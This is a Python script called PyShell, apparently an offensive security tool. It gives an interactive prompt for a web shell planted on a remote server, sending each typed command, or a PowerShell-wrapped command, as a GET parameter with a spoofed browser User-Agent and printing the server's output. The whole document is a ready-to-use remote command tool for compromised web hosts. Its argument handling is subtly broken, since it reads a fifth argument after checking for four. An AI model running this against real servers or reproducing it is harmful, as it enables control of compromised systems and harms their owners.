#!/usr/bin/python3
import sys
import requests
import readline
from termcolor import colored

banner = """
  ██▓███ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
 ▓██░  ██▒▒██  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
 ▓██░ ██▓▒ ▒██ ██░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
 ▒██▄█▓▒ ▒ ░ ▐██▓░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
 ▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒▓▒░ ░  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░▒ ░     ▓██ ░▒░ ░ ░▒    ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░░       ▒ ▒ ░░  ░  ░  ░   ░  ░░ ░         ░ ░     ░ ░   
          ░             ░      ░      ░       ░       ░         """

credits = '\n --------------- by @JoelGMSec & @3v4Si0N ---------------\n'

if len(sys.argv) == 1:
    print (colored(banner, 'green'))
    print (colored(credits, 'yellow'))
    print (colored("Usage: ", "yellow"), end='')
    print (colored("pyshell.py https://domain.com/shell.php -p payload -ps/-cmd\n", "white"))
    sys.exit()

def sendCommand(command, webshell):
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"}
    params = {sys.argv[3]:command.strip()}
    response = requests.get((webshell), params=params, headers=headers)
    return response.content.decode(errors='ignore')


if __name__ == "__main__":
    print (colored(banner, 'green'))
    print (colored(credits, 'yellow'))
    mode = ""
    webshell = sys.argv[1]

    if len(sys.argv) == 4:
        mode = sys.argv[4]

    while True:
        command = input(colored("PyShell $> ", "green"))
        if command == "exit":
            print ("")
            break
        else:
            if mode != "-ps":
                result = sendCommand(command, webshell)
                print (colored(result, "yellow"))
            else:
                result = sendCommand("powershell "+command, webshell)
                print (colored(result, "yellow"))
